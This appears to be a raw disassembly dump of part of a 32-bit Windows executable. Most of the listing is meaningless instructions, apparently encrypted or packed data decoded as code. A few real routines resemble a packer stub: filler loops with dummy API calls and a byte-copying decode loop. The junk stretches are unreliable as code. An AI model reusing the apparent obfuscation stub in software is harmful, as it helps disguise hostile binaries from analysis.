  4029b6:	jl     0x402a34
  4029b8:	jl     0x402a21
  4029ba:	and    ebp,esp
  4029bc:	push   edi
  4029bd:	int    0xa8
  4029bf:	xchg   edx,eax
  4029c0:	push   cs
  4029c1:	cmp    al,0xff
  4029c3:	jp     0x4029b2
  4029c5:	adc    ah,bh
  4029c7:	out    dx,eax
  4029c8:	nop
  4029c9:	and    edi,edx
  4029cb:	adc    bh,0xa3
  4029ce:	fisub  DWORD PTR [ebx+0x54d58ab3]
  4029d4:	ficomp WORD PTR [eax+0x6c]
  4029d7:	cmp    al,0xe1
  4029d9:	je     0x4029e4
  4029db:	bound  edi,QWORD PTR [edx]
  4029dd:	rol    DWORD PTR [edx],0x85
  4029e0:	inc    eax
  4029e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e2:	mov    esp,ds
  4029e4:	das    
  4029e5:	test   DWORD PTR [edx+0x34],esi
  4029e8:	adc    al,0x11
  4029ea:	cmc    
  4029eb:	outs   dx,DWORD PTR ds:[esi]
  4029ec:	dec    ebx
  4029ed:	add    DWORD PTR [esi],ebp
  4029ef:	mov    edx,0xc63801d0
  4029f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029f5:	and    BYTE PTR [ecx+0x49],al
  4029f8:	inc    esp
  4029f9:	lods   eax,DWORD PTR ds:[esi]
  4029fa:	bound  ebp,QWORD PTR [esi-0x30]
  4029fd:	adc    eax,0x13d9828e
  402a02:	es aas 
  402a04:	ja     0x402a1e
  402a06:	adc    edi,DWORD PTR [ebx+0x3588c488]
  402a0c:	and    bh,BYTE PTR [esi+0x17d95059]
  402a12:	push   edi
  402a13:	test   BYTE PTR [ecx+edi*2+0x71d050f3],dl
  402a1a:	aad    0x4a
  402a1c:	mov    WORD PTR [ebx+0xc86f43c],ds
  402a22:	repnz (bad) 
  402a24:	pushf  
  402a25:	xchg   edi,eax
  402a26:	push   cs
  402a27:	ret    0xa914
  402a2a:	out    0x59,al
  402a2c:	add    eax,0xa128097f
  402a31:	or     eax,0xe8ff02c2
  402a36:	xor    DWORD PTR [esp+ecx*1+0x519b38ff],edx
  402a3d:	gs pop esp
  402a3f:	lea    ebx,ds:0xf5af7d1d
  402a45:	jle    0x4029cc
  402a47:	std    
  402a48:	aam    0x2d
  402a4a:	pop    es
  402a4b:	mov    ds:0xb31357e9,eax
  402a50:	jbe    0x4029d4
  402a52:	(bad)  
  402a53:	sub    BYTE PTR [eax],dl
  402a55:	scas   eax,DWORD PTR es:[edi]
  402a56:	outs   dx,DWORD PTR ds:[esi]
  402a57:	inc    ebx
  402a58:	dec    edi
  402a59:	sub    esi,DWORD PTR [edi+ecx*2+0x64]
  402a5d:	jp     0x402aa4
  402a5f:	push   esi
  402a60:	leave  
  402a61:	cli    
  402a62:	sbb    BYTE PTR [edx+0x13d71ac1],al
  402a68:	sbb    DWORD PTR [ebx+0x35],0xf82dc9e7
  402a6f:	dec    edx
  402a70:	inc    ebx
  402a71:	add    ebx,DWORD PTR [edx+ebx*1]
  402a74:	jmp    0x402b47
  402a79:	in     al,dx
  402a7a:	test   eax,0xb57d3fe8
  402a7f:	sti    
  402a80:	mov    ecx,0xb7fd3b83
  402a85:	or     al,0x65
  402a87:	test   eax,esi
  402a89:	or     al,0xf
  402a8b:	jl     0x402b09
  402a8d:	mov    ds:0xae7c7c7c,al
  402a92:	ror    BYTE PTR [edx],0xf5
  402a95:	sbb    bl,BYTE PTR [esi-0x74e3c5a8]
  402a9b:	pushf  
  402a9c:	jmp    0x8cdb9ed1
  402aa1:	adc    DWORD PTR [eax+esi*4-0x29fa8127],ebx
  402aa8:	xchg   ebp,eax
  402aa9:	ss sbb eax,0x4788d83d
  402aaf:	imul   ebp
  402ab1:	sub    BYTE PTR [eax],0x71
  402ab4:	daa    
  402ab5:	xchg   esp,eax
  402ab6:	pop    edx
  402ab7:	mov    dl,0xf0
  402ab9:	push   eax
  402aba:	imul   edx,DWORD PTR [eax+0x39],0x55afb09d
  402ac1:	push   ebx
  402ac2:	in     al,dx
  402ac3:	or     eax,DWORD PTR [edx]
  402ac5:	in     al,0x43
  402ac7:	out    dx,al
  402ac8:	out    dx,al
  402ac9:	out    0xc6,al
  402acb:	out    dx,al
  402acc:	sbb    edx,DWORD PTR [ebx-0x5412e19f]
  402ad2:	push   0x6c6f9497
  402ad7:	and    ecx,DWORD PTR [edi-0x56]
  402ada:	push   eax
  402adb:	push   cs
  402adc:	jle    0x402b31
  402ade:	sbb    bh,BYTE PTR [ebx]
  402ae0:	mul    BYTE PTR [eax+eiz*1-0x58]
  402ae4:	mov    ds:0x6d41521f,al
  402ae9:	(bad)  
  402aea:	and    BYTE PTR [eax*2-0x7a44484a],bl
  402af1:	addr16 mov bh,0x79
  402af4:	push   edi
  402af5:	jbe    0x402b16
  402af7:	cmp    esp,edx
  402af9:	inc    edi
  402afa:	jp     0x402aa1
  402afc:	xlat   BYTE PTR ds:[ebx]
  402afd:	sti    
  402afe:	pop    ecx
  402aff:	scas   al,BYTE PTR es:[edi]
  402b00:	sbb    al,0x84
  402b02:	fs call 0x4584389e
  402b08:	das    
  402b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b0a:	imul   edi,DWORD PTR [ecx+ecx*2],0x40e12a9d
  402b11:	jmp    0x402b6b
  402b13:	js     0x402b29
  402b15:	out    dx,ax
  402b17:	xor    al,BYTE PTR [edx+0x9a12822]
  402b1d:	mov    ebp,es
  402b1f:	pop    ds
  402b20:	ret    
  402b21:	jl     0x402b1f
  402b23:	call   0x558a:0xcbf4dc98
  402b2a:	ret    0x79a6
  402b2d:	dec    ebp
  402b2e:	jnp    0x402b88
  402b30:	aaa    
  402b31:	in     al,0xc8
  402b33:	or     esp,DWORD PTR [ecx]
  402b35:	nop
  402b36:	ss loop 0x402b27
  402b39:	cmp    DWORD PTR ds:0x20d267e9,ebx
  402b3f:	or     al,0x38
  402b41:	je     0x402b79
  402b43:	mov    dh,0x72
  402b45:	adc    edi,esi
  402b47:	dec    ebx
  402b48:	xor    edx,edx
  402b4a:	add    DWORD PTR [ebp-0xc],ebx
  402b4d:	jmp    0x402c20
  402b52:	dec    ebx
  402b53:	jge    0x402bcf
  402b55:	cmp    BYTE PTR [edx-0x7d],0x6d
  402b59:	jge    0x402b07
  402b5b:	push   cs
  402b5c:	loope  0x402b36
  402b5e:	ins    DWORD PTR es:[edi],dx
  402b5f:	xchg   BYTE PTR [ebx+0x7c0fb2f9],ah
  402b65:	jl     0x402b09
  402b67:	jl     0x402be5
  402b69:	jl     0x402b58
  402b6b:	inc    ebx
  402b6c:	pop    es
  402b6d:	test   al,0xb9
  402b6f:	stos   DWORD PTR es:[edi],eax
  402b70:	sbb    ah,BYTE PTR [edx-0x60]
  402b73:	dec    edx
  402b74:	xchg   ebp,eax
  402b75:	add    eax,0x1811311b
  402b7a:	sar    BYTE PTR [edx],1
  402b7c:	jle    0x402ba0
  402b7e:	jnp    0x402ba8
  402b80:	and    edi,DWORD PTR [edi]
  402b82:	scas   al,BYTE PTR es:[edi]
  402b83:	cmc    
  402b84:	fsub   DWORD PTR [esi+0x51]
  402b87:	mov    al,ds:0x8b06c170
  402b8c:	mov    esp,0x61798474
  402b91:	pop    edi
  402b92:	xor    esi,DWORD PTR [esi+0x6be91415]
  402b98:	xchg   esp,eax
  402b99:	addr16 cmp al,0x16
  402b9c:	adc    ecx,DWORD PTR [ebp-0x559c7b6f]
  402ba2:	repz in al,dx
  402ba4:	mov    ch,0xc8
  402ba6:	xor    DWORD PTR [ecx],0xb
  402ba9:	push   ecx
  402baa:	cdq    
  402bab:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bad:	and    ebx,eax
  402baf:	fnstsw WORD PTR [edx-0x2eca0bfa]
  402bb5:	or     BYTE PTR ds:[esi],dh
  402bb8:	addr16 dec edi
  402bba:	dec    ebx
  402bbb:	mov    cl,0x8
  402bbd:	stos   BYTE PTR es:[edi],al
  402bbe:	jle    0x402b98
  402bc0:	clc    
  402bc1:	add    eax,0xacc572fc
  402bc6:	mov    ch,0x32
  402bc8:	lods   eax,DWORD PTR ds:[esi]
  402bc9:	dec    DWORD PTR [ecx-0x8]
  402bcc:	jns    0x402bf9
  402bce:	or     DWORD PTR [ecx+0x1cc077ec],edx
  402bd4:	lea    edi,[edx-0x46c6802c]
  402bda:	mov    ch,0xad
  402bdd:	jno    0x402b69
  402bdf:	jns    0x402b94
  402be1:	dec    esp
  402be2:	xchg   BYTE PTR [edx+ebp*2-0x7f],bh
  402be6:	(bad)  
  402be7:	test   eax,0xa921eda6
  402bec:	fs cdq 
  402bee:	es inc ebp
  402bf0:	cmp    eax,ecx
  402bf2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  402bf4:	(bad)  
  402bf5:	push   edi
  402bf6:	jo     0x402bc4
  402bf8:	retf   
  402bf9:	imul   edi,DWORD PTR [edi+0xb4d094a],0x45401305
  402c03:	les    edi,FWORD PTR [ecx+0x671256e2]
  402c09:	inc    edi
  402c0a:	cmp    DWORD PTR [ebx+edi*4+0x7cb5232c],eax
  402c11:	les    ebp,FWORD PTR [esi+0x6b8ec1d5]
  402c17:	cli    
  402c18:	adc    al,0xba
  402c1b:	mov    bl,0x50
  402c1d:	(bad)  
  402c1f:	xchg   BYTE PTR [ebx-0x75],bl
  402c22:	inc    ebp
  402c23:	hlt    
  402c24:	pop    edi
  402c25:	pop    esi
  402c26:	pop    ebx
  402c27:	leave  
  402c28:	ret    0x10
  402c2b:	push   ebp
  402c2c:	mov    ebp,esp
  402c2e:	sub    esp,0x20
  402c31:	leave  
  402c32:	ret    0x10
  402c35:	push   ebp
  402c36:	mov    ebp,esp
  402c38:	push   ecx
  402c39:	and    DWORD PTR ds:0x424861,0x0
  402c43:	jmp    0x402c56
  402c48:	xor    eax,eax
  402c4a:	xor    eax,DWORD PTR ds:0x424861
  402c50:	inc    eax
  402c51:	mov    ds:0x424861,eax
  402c56:	cmp    DWORD PTR ds:0x424861,0x1e
  402c5d:	jae    0x402d01
  402c63:	cmp    DWORD PTR ds:0x424861,0x11
  402c6a:	jne    0x402c83
  402c70:	push   0x0
  402c72:	push   0x44a6e8
  402c77:	push   DWORD PTR [ebp-0x20]
  402c7a:	push   DWORD PTR [ebp-0x14]
  402c7d:	call   DWORD PTR ds:0x4420d0
  402c83:	cmp    DWORD PTR ds:0x424861,0x10
  402c8a:	jne    0x402c9e
  402c90:	xor    eax,eax
  402c92:	add    eax,DWORD PTR ds:0x424861
  402c98:	inc    eax
  402c99:	mov    ds:0x424861,eax
  402c9e:	jmp    0x402c48
  402ca3:	and    DWORD PTR ds:0x4479a4,0x0
  402cad:	mov    edx,DWORD PTR ds:0x4479a4
  402cb3:	inc    edx
  402cb4:	mov    DWORD PTR ds:0x4479a4,edx
  402cba:	cmp    DWORD PTR ds:0x4479a4,0xd
  402cc1:	jne    0x402cda
  402cc7:	push   0x42485d
  402ccc:	push   DWORD PTR [ebp-0x28]
  402ccf:	push   0x3f88
  402cd4:	call   DWORD PTR ds:0x442000
  402cda:	cmp    DWORD PTR ds:0x4479a4,0xc
  402ce1:	jne    0x402cf4
  402ce7:	mov    edx,DWORD PTR ds:0x4479a4
  402ced:	inc    edx
  402cee:	mov    DWORD PTR ds:0x4479a4,edx
  402cf4:	cmp    DWORD PTR ds:0x4479a4,0x17
  402cfb:	jb     0x402cad
  402d01:	push   ecx
  402d02:	mov    eax,0xf89c8535
  402d07:	mov    DWORD PTR ds:0x424855,0x10
  402d11:	cmp    DWORD PTR ds:0x424855,0x0
  402d18:	je     0x402d61
  402d1e:	cmp    DWORD PTR ds:0x424855,0x1d
  402d25:	jne    0x402d4f
  402d2b:	push   0x44a6d0
  402d30:	push   0x44a6d0
  402d35:	push   0x8e35
  402d3a:	push   0x4109ab
  402d3f:	push   0x410971
  402d44:	push   0x410927
  402d49:	call   DWORD PTR ds:0x442348
  402d4f:	mov    edx,DWORD PTR ds:0x424855
  402d55:	dec    edx
  402d56:	mov    DWORD PTR ds:0x424855,edx
  402d5c:	jmp    0x402d11
  402d61:	mov    DWORD PTR [ebp-0x8],eax
  402d64:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402d6b:	mov    edx,DWORD PTR [ebp-0x8]
  402d6e:	push   esi
  402d6f:	mov    ecx,0x7510857
  402d74:	xor    edx,ecx
  402d76:	mov    esi,0x32729e
  402d7b:	push   edi
  402d7c:	mov    edi,DWORD PTR [ebp+0x10]
  402d7f:	add    edx,esi
  402d81:	cmp    edi,edx
  402d83:	je     0x403249
  402d89:	mov    edx,DWORD PTR [ebp-0x8]
  402d8c:	mov    eax,DWORD PTR [ebp-0x4]
  402d8f:	xor    eax,ecx
  402d91:	mov    edi,0xffcd8d62
  402d96:	sub    edi,eax
  402d98:	add    edi,DWORD PTR [ebp+0x10]
  402d9b:	xor    edx,ecx
  402d9d:	add    edx,esi
  402d9f:	cmp    edx,edi
  402da1:	ja     0x4030d5
  402da7:	jmp    0x402f16
  402dac:	sbb    eax,0xa4b3a405
  402db1:	ins    DWORD PTR es:[edi],dx
  402db2:	std    
  402db3:	pop    ebp
  402db4:	mov    eax,0x66e45e2b
  402db9:	and    DWORD PTR [esi+0x7c0ef8d5],0x7c7fce7c
  402dc3:	jl     0x402dda
  402dc5:	dec    ebp
  402dc6:	pop    ss
  402dc7:	mov    ebp,0x6ce0b960
  402dcc:	xchg   DWORD PTR [edx+0x5f],ecx
  402dcf:	or     DWORD PTR [eax-0x61],ebp
  402dd2:	mov    cl,BYTE PTR [edx-0x6a0bb03e]
  402dd8:	jae    0x402d87
  402dda:	dec    edi
  402ddb:	ret    0xefd0
  402dde:	push   edi
  402ddf:	in     eax,dx
  402de0:	in     al,0xc1
  402de2:	adc    eax,0xd635a3e2
  402de7:	and    al,0xf2
  402de9:	int    0x1c
  402deb:	rep lods al,BYTE PTR ds:[esi]
  402ded:	xor    dl,ch
  402def:	or     ebp,eax
  402df1:	cs sub al,0x6e
  402df4:	jge    0x402df1
  402df6:	sub    DWORD PTR [eax+0x43],0x9
  402dfa:	mov    WORD PTR [eax],cs
  402dfc:	xchg   edx,eax
  402dfd:	jge    0x402dbb
  402dff:	test   cl,ah
  402e01:	push   ecx
  402e02:	test   DWORD PTR [eax+0x3],ebp
  402e05:	lods   al,BYTE PTR ds:[esi]
  402e06:	xchg   dl,bl
  402e08:	lea    ecx,[eax-0x5d31c046]
  402e0e:	lods   eax,DWORD PTR ds:[esi]
  402e0f:	cld    
  402e10:	mov    ecx,0x4ac90429
  402e15:	xor    al,0x7f
  402e17:	inc    ecx
  402e18:	rcl    DWORD PTR [bx+di],0xec
  402e1c:	push   es
  402e1d:	dec    eax
  402e1e:	mov    edx,DWORD PTR [ebx+edi*4-0x60313443]
  402e25:	ror    DWORD PTR [ecx-0x1ac9f5d8],cl
  402e2b:	pop    ebp
  402e2c:	jo     0x402ead
  402e2e:	(bad)  
  402e2f:	ffree  st(3)
  402e31:	in     al,0x1e
  402e33:	dec    eax
  402e34:	mov    edi,0x102f7119
  402e39:	jb     0x402dea
  402e3b:	adc    BYTE PTR [edi-0x69e46a96],al
  402e41:	pop    ds
  402e42:	jecxz  0x402e87
  402e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e45:	(bad)  
  402e46:	fld    TBYTE PTR ds:0xcbdeb34f
  402e4c:	sbb    BYTE PTR ds:0x396405c7,dh
  402e52:	(bad)  
  402e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e54:	cmp    BYTE PTR [edx+0x36b7253d],ch
  402e5a:	jmp    0xc8f0e01d
  402e5f:	mov    DWORD PTR [ecx-0x4b1cbd8e],ebx
  402e65:	xchg   ecx,eax
  402e66:	jmp    0xa2328136
  402e6b:	mov    al,0xa9
  402e6d:	popf   
  402e6e:	aaa    
  402e6f:	cmc    
  402e70:	jno    0x402e49
  402e72:	mov    ecx,0x54973200
  402e77:	sbb    al,0x1
  402e79:	jbe    0x402ea6
  402e7b:	in     eax,dx
  402e7c:	mov    cl,0xe1
  402e7e:	sub    ebp,DWORD PTR [eax-0x1efc11c0]
  402e84:	test   edi,ecx
  402e86:	aam    0x34
  402e88:	jno    0x402e0f
  402e8a:	cmp    eax,0x9dd82ca1
  402e8f:	push   ebx
  402e90:	ja     0x402ef3
  402e92:	ror    BYTE PTR [eax],cl
  402e94:	je     0x402ed0
  402e96:	add    al,0x62
  402e98:	pop    eax
  402e99:	in     al,0xfa
  402e9b:	mov    esi,0xa224870e
  402ea0:	adc    BYTE PTR [edi+0x69],bl
  402ea3:	xor    eax,0x3d3e009c
  402ea8:	push   0x7b4794b2
  402ead:	out    dx,al
  402eae:	cwde   
  402eaf:	into   
  402eb0:	dec    ecx
  402eb1:	cmovl  edi,DWORD PTR [eax-0x55]
  402eb5:	push   0x4b886cce
  402eba:	jb     0x402f29
  402ebc:	inc    esi
  402ebd:	outs   dx,BYTE PTR ds:[esi]
  402ebe:	push   0x5
  402ec0:	xchg   edi,eax
  402ec1:	xchg   bp,ax
  402ec3:	das    
  402ec4:	xor    ch,BYTE PTR [edx+0x38]
  402ec7:	lock aaa 
  402ec9:	dec    ebp
  402eca:	add    BYTE PTR [edx-0x2c],0x2e
  402ece:	and    eax,DWORD PTR [edx+0x3]
  402ed1:	and    dh,BYTE PTR [eax+0xc4edc6f]
  402ed7:	xchg   ebp,eax
  402ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed9:	loop   0x402ebd
  402edb:	mov    ah,0x73
  402edd:	aas    
  402ede:	leave  
  402edf:	sar    DWORD PTR ds:0x12880363,0x18
  402ee6:	fdiv   DWORD PTR [ebp+0x71]
  402ee9:	xchg   edi,eax
  402eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eeb:	jge    0x402ede
  402eed:	test   al,0x11
  402eef:	xor    ch,bl
  402ef1:	or     ecx,0x70
  402ef4:	dec    edx
  402ef5:	out    0xb4,eax
  402ef7:	xor    al,0x98
  402ef9:	add    bl,BYTE PTR [esi+0x174ab219]
  402eff:	push   ds
  402f00:	js     0x402f2f
  402f02:	and    al,0x71
  402f04:	mov    ecx,0x167ef274
  402f09:	jl     0x402f59
  402f0b:	stos   BYTE PTR es:[edi],al
  402f0c:	in     eax,0x8c
  402f0e:	push   edi
  402f0f:	push   ecx
  402f10:	mov    esp,0x94a6ded6
  402f15:	scas   al,BYTE PTR es:[edi]
  402f16:	push   ebx
  402f17:	jmp    0x402f21
  402f1c:	mov    esi,0x32729e
  402f21:	mov    eax,DWORD PTR [ebp-0x8]
  402f24:	mov    edi,DWORD PTR [ebp-0x4]
  402f27:	xor    edi,ecx
  402f29:	add    edi,esi
  402f2b:	mov    esi,DWORD PTR [ebp+0x8]
  402f2e:	imul   edi,edx
  402f31:	mov    ebx,DWORD PTR [ebp+0xc]
  402f34:	xor    eax,ecx
  402f36:	add    eax,edx
  402f38:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  402f3f:	mov    BYTE PTR [edi+esi*1],al
  402f42:	mov    eax,DWORD PTR [ebp-0x4]
  402f45:	xor    eax,ecx
  402f47:	lea    edx,[edx+eax*1+0x32729e]
  402f4e:	mov    eax,DWORD PTR [ebp-0x4]
  402f51:	xor    eax,ecx
  402f53:	mov    esi,0xffcd8d62
  402f58:	sub    esi,eax
  402f5a:	add    esi,DWORD PTR [ebp+0x10]
  402f5d:	jmp    0x4030cc
  402f62:	jp     0x402f87
  402f64:	pop    ebp
  402f65:	cmp    BYTE PTR [ebp+0x7a],bl
  402f68:	jge    0x402fcf
  402f6a:	mov    ss,WORD PTR [ebp+0x4f]
  402f6d:	push   edx
  402f6e:	sbb    al,0x24
  402f70:	retf   0x4a34
  402f73:	add    DWORD PTR [esp+edi*2-0x32],edi
  402f77:	jg     0x402ff5
  402f79:	jl     0x402fdb
  402f7b:	jl     0x402fae
  402f7d:	add    al,0x8b
  402f7f:	and    BYTE PTR [ecx-0x79a9169d],cl
  402f85:	mov    esp,0x38f8e796
  402f8a:	jecxz  0x402fc0
  402f8c:	clc    
  402f8d:	clc    
  402f8e:	pop    ebx
  402f8f:	sbb    al,0x0
  402f91:	enter  0xaf3b,0x35
  402f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f96:	imul   ebx,ebx,0xffffffdb
  402f99:	lock adc esi,DWORD PTR [ebp+0x64]
  402f9d:	xlat   BYTE PTR ds:[ebx]
  402f9e:	shr    BYTE PTR [edi],0xd6
  402fa1:	sub    eax,0xe380ffa3
  402fa6:	pusha  
  402fa7:	xchg   ecx,eax
  402fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fa9:	dec    edi
  402faa:	cmc    
  402fab:	and    ecx,DWORD PTR [ebp+0x16]
  402fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402faf:	inc    edi
  402fb0:	xchg   esi,eax
  402fb1:	outs   dx,BYTE PTR ds:[esi]
  402fb2:	lea    eax,[eax]
  402fb4:	cmp    eax,0xc5023395
  402fb9:	outs   dx,DWORD PTR ds:[esi]
  402fba:	jns    0x40301b
  402fbc:	xor    esi,DWORD PTR [esi+0x14]
  402fbf:	cmp    eax,0xf090a9f2
  402fc4:	cmp    ax,0x29d5
  402fc8:	pop    edx
  402fc9:	mov    bh,0x1b
  402fcb:	fcom   st(0)
  402fcd:	stos   DWORD PTR es:[edi],eax
  402fce:	add    esp,DWORD PTR [ecx-0x5b]
  402fd1:	(bad)  
  402fd2:	les    eax,FWORD PTR [edx-0xb1c7496]
  402fd8:	jnp    0x402f7c
  402fda:	xor    BYTE PTR [edx+ecx*8+0x39],0xe9
  402fdf:	push   0xffffff9f
  402fe1:	ss jp  0x403007
  402fe4:	dec    edx
  402fe5:	mov    esp,0x45f008cf
  402fea:	aad    0xd
  402fec:	sbb    edi,DWORD PTR [ebx]
  402fee:	setbe  BYTE PTR [esi]
  402ff1:	loopne 0x403027
  402ff3:	test   BYTE PTR [ecx],dl
  402ff5:	dec    esi
  402ff6:	inc    edi
  402ff7:	outs   dx,BYTE PTR ds:[esi]
  402ff8:	xchg   edi,eax
  402ff9:	jb     0x403014
  402ffb:	clc    
  402ffc:	imul   esp,edi,0xb74cc043
  403002:	jb     0x40301c
  403004:	mov    al,ds:0xd5d46c60
  403009:	or     esp,esi
  40300b:	into   
  40300c:	dec    esi
  40300d:	ja     0x403074
  40300f:	add    bl,dh
  403011:	popf   
  403012:	dec    ecx
  403013:	dec    ebx
  403014:	in     eax,0xe0
  403016:	jmp    0xf428:0x326c188
  40301d:	xchg   esp,eax
  40301e:	ror    DWORD PTR [ebp+0x4e],1
  403021:	xor    eax,DWORD PTR [ebx-0x22]
  403024:	xchg   edx,eax
  403025:	and    BYTE PTR [ebx-0x3],0x86
  403029:	int    0x3f
  40302b:	sbb    eax,esi
  40302d:	dec    ebx
  40302e:	popa   
  40302f:	xor    eax,0xd7244178
  403034:	stos   DWORD PTR es:[edi],eax
  403035:	les    ebx,FWORD PTR [esi+0x4c]
  403038:	sbb    esp,DWORD PTR [eax*1-0x4b4af408]
  40303f:	inc    esp
  403041:	push   0xf9033fed
  403046:	(bad)  
  403047:	sub    BYTE PTR [esi],cl
  403049:	stos   DWORD PTR es:[edi],eax
  40304a:	jl     0x403069
  40304c:	and    al,0xc7
  40304e:	mov    eax,0xf4f6f66d
  403053:	jmp    0x1f4cd7be
  403058:	and    al,0x5b
  40305a:	inc    edi
  40305b:	jmp    0x87e0:0x4c2e5e18
  403062:	add    bl,ch
  403064:	inc    ebp
  403065:	xchg   esp,eax
  403066:	stos   DWORD PTR es:[edi],eax
  403067:	adc    al,0xe5
  403069:	jbe    0x403085
  40306b:	js     0x403074
  40306d:	imul   edi,DWORD PTR [ebx],0x65
  403070:	out    dx,al
  403071:	jl     0x40302d
  403073:	mov    al,ds:0x9ce886d
  403078:	lds    ecx,FWORD PTR ds:0xd5231234
  40307e:	sbb    al,0xc5
  403080:	sub    DWORD PTR [ebx-0x39],eax
  403083:	repz jl 0x4030fa
  403086:	sar    al,cl
  403088:	xchg   edx,eax
  403089:	fsub   DWORD PTR gs:[ecx+ebp*8]
  40308d:	mov    cl,0x4d
  40308f:	ds repnz ss xchg ebp,eax
  403093:	adc    cl,BYTE PTR [ecx-0xf]
  403096:	jno    0x403085
  403098:	call   0x73364a6e
  40309d:	call   0x2302f15c
  4030a2:	pop    edx
  4030a3:	test   al,0x2b
  4030a5:	sar    BYTE PTR [eax+0x62],0x42
  4030a9:	add    DWORD PTR [esi],esi
  4030ab:	sbb    esi,DWORD PTR [edx]
  4030ad:	and    DWORD PTR [ebx+0x91ae8bf],edx
  4030b3:	sub    dh,al
  4030b5:	pop    ecx
  4030b6:	nop
  4030b7:	mov    BYTE PTR [ecx-0x3f],dh
  4030ba:	fistp  DWORD PTR [ebx]
  4030bc:	jmp    FWORD PTR [eax]
  4030be:	ins    BYTE PTR es:[edi],dx
  4030bf:	arpl   WORD PTR [edx-0x59],ax
  4030c2:	pop    ecx
  4030c3:	(bad)  
  4030c4:	add    BYTE PTR [esi],bh
  4030c6:	inc    esi
  4030c7:	xchg   edi,eax
  4030c8:	sbb    eax,0x3b4a7f9f
  4030cd:	(bad)  
  4030ce:	jbe    0x402f1c
  4030d4:	pop    ebx
  4030d5:	mov    eax,0xf89c8534
  4030da:	jmp    0x403249
  4030df:	jno    0x403104
  4030e1:	in     al,0x69
  4030e3:	cli    
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	cmp    DWORD PTR [ebx+0x12],0x45299de8
  4030ec:	xor    al,dl
  4030ee:	add    DWORD PTR [ebx+eax*1],ebx
  4030f1:	jl     0x40316f
  4030f3:	into   
  4030f4:	jg     0x403172
  4030f6:	jl     0x403156
  4030f8:	push   0xf018b4ff
  4030fd:	mov    bh,0xf
  4030ff:	shl    DWORD PTR [edi+0x43],0x62
  403103:	adc    bl,bh
  403105:	mov    al,0xac
  403107:	(bad)  
  403108:	pop    ds
  403109:	cbw    
  40310b:	shr    dl,0xe5
  40310e:	div    DWORD PTR [edi+0x61]
  403111:	in     eax,0x80
  403113:	int3   
  403114:	dec    edi
  403115:	mov    ds:0x6dde070e,eax
  40311a:	enter  0x556b,0xa3
  40311e:	add    al,0xa0
  403120:	les    ebx,FWORD PTR [eax+ecx*4]
  403123:	add    eax,0x1f403b87
  403128:	ins    BYTE PTR es:[edi],dx
  403129:	sbb    BYTE PTR [ebx],bh
  40312b:	push   ds
  40312c:	mov    bl,0x24
  40312e:	imul   ebx,esp,0xb
  403131:	js     0x40312a
  403133:	adc    ebx,DWORD PTR [ebx+eax*1-0x4a6e3671]
  40313a:	xor    al,0x8c
  40313c:	loopne 0x40317c
  40313e:	enter  0x8f0a,0x8f
  403142:	mov    ecx,0xae97dfc9
  403147:	ficom  DWORD PTR [esp+esi*8]
  40314a:	popa   
  40314b:	rcl    DWORD PTR [esi],cl
  40314d:	pop    esp
  40314e:	(bad)  
  403150:	ss loop 0x4031d2
  403153:	lahf   
  403154:	push   esi
  403155:	mov    ch,0x70
  403157:	or     cl,bl
  403159:	jns    0x40311d
  40315b:	jmp    FWORD PTR [esi+0x2f]
  40315e:	jbe    0x4031bd
  403160:	test   DWORD PTR [esi],ebp
  403162:	and    eax,DWORD PTR ds:0x682bc3b
  403168:	xor    eax,0x68ac8af7
  40316d:	push   edi
  40316e:	sti    
  40316f:	es retf 
  403171:	jns    0x4031a4
  403173:	mov    ebp,0xf372f55a
  403178:	push   ss
  403179:	push   ebp
  40317a:	sub    DWORD PTR [edx-0x66],ebx
  40317d:	dec    edx
  40317e:	lods   al,BYTE PTR ds:[esi]
  40317f:	in     eax,0xcc
  403181:	je     0x403148
  403183:	call   FWORD PTR ds:0xb140ff97
  403189:	inc    edx
  40318a:	fxch   st(3)
  40318c:	icebp  
  40318d:	jb     0x403201
  40318f:	or     al,0xc
  403191:	dec    edi
  403192:	xor    BYTE PTR [edi-0x1bf321e7],ah
  403198:	imul   ebx,ebx,0x6d
  40319b:	xchg   edx,eax
  40319c:	pop    ss
  40319d:	es sahf 
  40319f:	(bad)  
  4031a0:	jns    0x403202
  4031a2:	xor    edx,DWORD PTR [ebp+0x40]
  4031a5:	nop
  4031a6:	jecxz  0x40318d
  4031a8:	call   0xb3d7:0xab90a0a0
  4031af:	aad    0xb3
  4031b1:	lea    ecx,[edx]
  4031b3:	sar    esi,cl
  4031b5:	xor    esi,DWORD PTR ds:0x24e625d7
  4031bb:	add    ch,BYTE PTR [ecx]
  4031bd:	loopne 0x403186
  4031bf:	hlt    
  4031c0:	aad    0x8
  4031c2:	das    
  4031c3:	xor    ah,BYTE PTR [eax-0x5bd47119]
  4031c9:	mov    ebp,0x2eeaa40a
  4031ce:	sub    DWORD PTR [edi+esi*1-0x10fb4c32],edx
  4031d5:	test   eax,0x5c9db31b
  4031da:	int3   
  4031db:	bound  edx,QWORD PTR [edx+0x63]
  4031de:	js     0x40319a
  4031e0:	xor    eax,0x7f644c55
  4031e5:	xchg   DWORD PTR [eax+ebx*8+0x4c],edx
  4031e9:	mov    ch,0x94
  4031eb:	cmp    eax,0xaa903650
  4031f0:	cs cdq 
  4031f2:	out    0x85,al
  4031f4:	sar    BYTE PTR [eax-0x3b0ae165],0xec
  4031fb:	pop    ebx
  4031fc:	popf   
  4031fd:	imul   edi,ecx,0x1b09ceef
  403203:	sub    BYTE PTR [ebp+0x4d],0xce
  403207:	xchg   ebp,eax
  403208:	mov    esi,0x3d5cd798
  40320d:	mov    eax,ds:0x638041be
  403212:	push   ds
  403213:	aas    
  403214:	xchg   edx,eax
  403215:	push   eax
  403216:	inc    eax
  403217:	rol    bl,1
